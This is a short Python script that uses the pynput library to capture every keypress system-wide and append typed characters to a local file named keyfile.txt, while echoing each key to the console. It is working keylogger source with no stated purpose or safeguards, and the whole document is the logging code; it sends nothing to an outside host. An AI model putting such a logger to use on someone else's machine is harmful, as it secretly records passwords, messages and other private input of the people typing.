from pynput import keyboard

def pressedkey(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error receiving in char")
if __name__ == "__main__":
    listener = keyboard.Listener(on_press = pressedkey)
    listener.start()
    input()


